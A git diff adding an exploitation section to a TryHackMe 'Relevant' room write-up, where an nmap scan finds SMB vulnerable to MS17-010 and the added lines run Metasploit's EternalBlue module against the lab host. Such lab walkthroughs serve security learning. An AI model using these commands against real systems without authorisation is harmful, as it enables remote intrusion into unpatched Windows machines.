@@ -105,6 +105,22 @@ nmap -p 139,445 -Pn -script smb-vuln* 10.10.39.76
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT6.png?raw=true)<br />
 Bingo! It looks like the SMB server is vulnerable to MS17-010. Let's try to exploit the vulnerability.<br />
 
+#Exploitation
+
+
+## MS17-010 Remote Code Execution
+
+We're going to use Metasploit to exploit the vulnerability, let's fire it up.<br />
+```shell
+msfconsole
+```
+Once we have Metasploit open we're going to select the module to use and then set the required options.<br />
+```shell
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 10.10.39.76
+exploit
+```
 
 
 ## Questions & Answers
